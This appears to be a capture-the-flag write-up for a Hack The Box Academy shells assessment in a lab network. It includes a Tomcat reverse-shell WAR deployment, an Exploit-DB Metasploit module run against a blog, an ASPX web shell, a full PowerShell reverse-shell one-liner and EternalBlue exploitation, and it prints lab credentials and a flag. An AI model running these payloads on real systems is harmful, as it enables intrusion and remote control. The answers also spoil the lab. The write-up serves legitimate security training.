# SKILLS ASSESSEMENT

## <mark style="color:red;">Credentials and Other Needed Info:</mark> <a href="#id-88e2" id="id-88e2"></a>

* IP: 10.129.204.126
* username: htb-student
* password: HTB\_@cademy\_stdnt!

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*HdZr5YfAWBWTdOLcwn9suQ.png" alt="" height="352" width="700"><figcaption></figcaption></figure>

## <mark style="color:red;">Initial Access</mark> <a href="#f51d" id="f51d"></a>

The first step in accessing the target machine was to connect via Remote Desktop Protocol (RDP). The target machine’s IP address was `10.129.204.126`. Using the provided credentials.

```
xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*PUGswzk7TikBQSWxFX2ynw.png" alt="" height="531" width="700"><figcaption></figcaption></figure>

During my exploration of the desktop, I found a file named `access-creds.txt`This file appeared to contain sensitive information.

```
to manage the blog:
- admin / admin123!@#  ( keep it simple for the new admins )

to manage Tomcat on apache
- tomcat / Tomcatadm


Change the passwords soon..
```

To further enumerate the network and identify other potential targets or services running, I performed an Nmap scan on the subnet `172.16.1.0/23`. This scan aimed to discover active hosts and open ports, along with service versions and default scripts.

## <mark style="color:red;">Scan Results</mark> <a href="#id-7b0f" id="id-7b0f"></a>

The Nmap scan provided the following results:

{% code fullWidth="true" %}
```
$nmap -sC -sV 172.16.1.0/23
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-03 10:48 EDT
Stats: 0:01:15 elapsed; 508 hosts completed (4 up), 4 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 10:49 (0:00:11 remaining)
Nmap scan report for 172.16.1.5
Host is up (0.040s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server xrdp

Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.048s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Inlanefreight Server Status
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2024-08-03T14:49:29+00:00
|_ssl-date: 2024-08-03T14:49:34+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2024-08-02T14:16:01
|_Not valid after:  2025-02-01T14:16:01
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-title: Apache Tomcat/10.0.11
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:20:65 (VMware)
| smb2-time: 
|   date: 2024-08-03T14:49:29
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-03T07:49:29-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Inlanefreight Gabber
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.1.13
Host is up (0.050s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-title: 172.16.1.13 - /
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:04:83 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-08-03T14:49:28
|_  start_date: 2024-08-03T14:15:52
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-03T07:49:28-07:00
|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s

Post-scan script results:
| clock-skew: 
|   1h24m00s: 
|     172.16.1.11 (status.inlanefreight.local)
|_    172.16.1.13
```
{% endcode %}

## Analysis of Scan Results <a href="#b6cd" id="b6cd"></a>

* **172.16.1.5:** This host is running the Microsoft RDP service (ms-wbt-server), which might be used for remote desktop access.

1. **172.16.1.11:** This host is running multiple services including:

> hostname of Host-1 : shells-winsvr

* HTTP on port 80 served by Microsoft IIS 10.0, with the title “Inlanefreight Server Status”.
* Various Microsoft RPC services on ports 135, 2103, 2105, and 2107.
* SMB service on ports 139 and 445.
* Printer service on port 515.
* Apache Tomcat service on port 8080.

**2. 172.16.1.12:** This host is running:

* SSH service on port 22 served by OpenSSH 8.2p1 on Ubuntu.
* HTTP service on port 80 served by Apache httpd 2.4.41 on Ubuntu, with the title “Inlanefreight Gabber”.

**3. 172.16.1.13:** This host is running:

* HTTP on port 80 served by Microsoft IIS 10.0.
* Various Microsoft RPC services on ports 135 and 139.
* SMB service on port 445.

## Exploiting Apache Tomcat Manager <a href="#id-416a" id="id-416a"></a>

With the information gathered from the initial access and network scanning, I identified an Apache Tomcat service running on `172.16.1.11` (Host 1) on port 8080. Using the credentials found in the `access-creds.txt` file, I attempted to access the Tomcat Manager Panel.

## Accessing the Tomcat Manager Panel <a href="#id-3bbc" id="id-3bbc"></a>

1. **Target IP Address:** `172.16.1.11`
2. **Port:** `8080`
3. **Service:** Apache Tomcat 10.0.11
4. tomcat:Tomcatadm

```
http://172.16.1.11:8080/manager
```

## Deploying a Malicious WAR File <a href="#id-4a28" id="id-4a28"></a>

Uploading a malicious WAR (Web Application Archive) file to gain a reverse shell or remote code execution on the server.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o rev_shell.war
```

I then uploaded the `rev_shell.war` file through the Tomcat Manager Panel:

1. Navigate to the “Deploy” section in the Tomcat Manager Panel.
2. Select the `rev_shell.war` file for deployment.
3. Click on the “Deploy” button.

```
nc -lnvp 4444
http://172.16.1.11:8080/rev_shell/
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*MU9FgFM7-WhM2HVFR8Vi1g.png" alt="" height="535" width="700"><figcaption></figcaption></figure>

This provided me with a reverse shell on the target machine.

> name of the folder located in C:\Shares\ : dev-share

## Host-2 <a href="#id-66b2" id="id-66b2"></a>

> distribution of Linux is running on Host-2 : Ubuntu

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*mxG-FV3rHqQdX_tDYc3HVw.png" alt="" height="534" width="700"><figcaption></figcaption></figure>

### File Transfer to Target Machine <a href="#id-3797" id="id-3797"></a>

## Downloading `50064.rb` <a href="#b2f4" id="b2f4"></a>

First, I downloaded the `50064.rb` script to my local machine from a reliable source or repository.

```
wget https://www.exploit-db.com/download/50064
python3 -m http.server 8080
```

Downloading `50064.rb` on the Target Machine

```
wget http://10.10.14.242:8080/50064.rb
```

What language is the shell written in that gets uploaded when using the 50064?rb exploit?

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*TW6uHlz-RNLVouod.png" alt="" height="239" width="700"><figcaption></figcaption></figure>

**Adding this Custom Exploit to Metasploit:**

```
sudo cp 50064 /usr/share/metasploit-framework/modules/exploits/
```

### use the custom module <a href="#edbd" id="edbd"></a>

```
msfconsole
use /exploits/50064
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*xRkSrhAuvWjaL1UmiutD4A.png" alt="" height="500" width="700"><figcaption></figcaption></figure>

```
set PASSWORD admin123!@#
set RHOSTS 172.16.1.12
set USERNAME admin
set vhost blog.inlanefreight.local
exploit
```

as we see it make connection with 172.16.1.12 host with blind shell

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*JWgSC0_3uEChYOyG.png" alt="" height="202" width="700"><figcaption></figcaption></figure>

> flag : B1nD\_Shells\_r\_cool

Host-3

> explore status.inlanefreight.local

```

cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Add your IP address to the `allowedIps` variable on line `59`

We are taking advantage of the upload function at the bottom of the status page(`Green Arrow`) for this to work. Select your shell file and hit upload. If successful, it should print out the path to where the file was saved

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*Jbkj2KlNs2K1E-Zn.png" alt="" height="514" width="700"><figcaption></figcaption></figure>

Once the upload is successful, you will need to navigate to your web shell to utilize its functions

<figure><img src="https://miro.medium.com/v2/resize:fit:686/0*UnmceMkPQcLiWYSB.png" alt="" height="302" width="686"><figcaption></figcaption></figure>

`Powershell` one-liner used to connect back to a listener that has been started on an attack box

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.1.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

After uploading my ASPX shell to the web server, I used a PowerShell one-liner to create a reverse shell. However, I ended up with only user-level access.

After some searching, I discovered a vulnerable SMB service susceptible to the MS17–010 exploit.

```
Search ms17
```

{% code fullWidth="true" %}
```
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 172.16.1.13

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 172.16.1.13:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 172.16.1.13:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
{% endcode %}

Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let’s set up the exploit and payload now, then give it a shot.

1. Select Exploit & Payload, then Deliver

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*hinFlDZK2Z7v2ela.png" alt="" height="345" width="700"><figcaption></figcaption></figure>

set all requirements and run

```
set RHOSTS 172.16.1.13
set lhost 172.16.1.5
run
```

Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt
